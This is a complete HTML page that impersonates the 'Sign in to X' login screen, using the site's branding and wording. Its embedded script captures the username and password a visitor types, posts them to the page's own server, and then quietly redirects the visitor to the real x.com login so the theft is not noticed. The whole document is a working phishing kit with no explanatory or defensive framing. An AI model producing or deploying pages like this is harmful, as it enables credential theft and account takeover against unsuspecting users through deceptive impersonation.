<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>X. It's what's happening</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}.box{width:100%;max-width:600px;padding:20px}.logo{text-align:center;margin-bottom:30px;color:white;font-size:40px;font-weight:bold}.title{color:#e7e9ea;font-size:31px;font-weight:700;margin-bottom:12px}input{width:100%;padding:16px 12px;background:#000;border:1px solid #333639;border-radius:4px;color:white;font-size:17px;margin-bottom:20px;outline:none}input:focus{border-color:#1d9bf0}input[type="submit"]{background:#eff3f4;color:#0f1419;border:none;font-weight:700;font-size:15px;cursor:pointer;border-radius:20px}.links{display:flex;justify-content:space-between;margin-top:20px}.links a{color:#1d9bf0;text-decoration:none;font-size:14px}</style></head><body><div class="box"><div class="logo">𝕏</div><div class="title">Sign in to X</div><form method="POST"><input type="text"name="username"placeholder="Phone, email, or username"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Next"></form><div class="links"><a href="#">Forgot password?</a><a href="#">Sign up</a></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://x.com/i/flow/login';});});</script></body></html>
